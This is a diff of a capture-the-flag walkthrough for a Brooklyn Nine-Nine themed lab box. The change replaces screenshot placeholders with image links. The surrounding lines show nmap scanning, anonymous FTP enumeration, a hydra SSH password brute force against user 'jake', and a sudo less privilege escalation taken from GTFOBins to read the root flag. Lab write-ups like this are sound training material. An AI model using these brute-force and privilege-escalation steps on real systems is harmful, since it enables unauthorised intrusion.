@@ -12,7 +12,7 @@ _AHH Jake!_
 namp <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="722" height="252" alt="SCREEN01" src="https://github.com/user-attachments/assets/cf141ebc-804a-4811-918f-4ceef7d7591d" />
 
 2. Enumerate anonymous FTP. Connect and download .txt file
 
@@ -37,7 +37,7 @@ Jake please change your password. It is too weak and holt will be mad if someone
 hydra -l jake -P /root/Tools/wordlists/rockyou.txt ssh://<TARGET_IP>
 ```
 
-[SCREEN02]
+<img width="721" height="235" alt="SCREEN02" src="https://github.com/user-attachments/assets/912e0fd9-4015-4ceb-b491-eaafd5912ea7" />
 
 4. SSH into the box and retrieve the user flag
 
@@ -46,7 +46,7 @@ ssh jake@<TARGET_IP>
 cat /home/holt/user.txt
 ```
 
-[SCREEN03]
+<img width="725" height="306" alt="SCREEN03" src="https://github.com/user-attachments/assets/6d3aa9ef-2776-4fce-8a25-f590b89d5cf1" />
 
 ---
 
@@ -60,7 +60,7 @@ _Sudo is a good command_
 sudo -l
 ```
 
-[SCREEN04]
+<img width="722" height="145" alt="SCREEN04" src="https://github.com/user-attachments/assets/ca1c204d-73f5-4fa0-8d10-96a6886dc802" />
 
 2. Abuse an allowed binary using [GTFOBins](https://gtfobins.github.io/gtfobins/less/)
 
@@ -70,4 +70,4 @@ sudo /usr/bin/less /etc/profile
 cat /root/root.txt
 ```
 
-[SCREEN05]
+<img width="721" height="109" alt="SCREEN05" src="https://github.com/user-attachments/assets/2618812f-53f4-4d16-a0ed-ef283c4f0af6" />
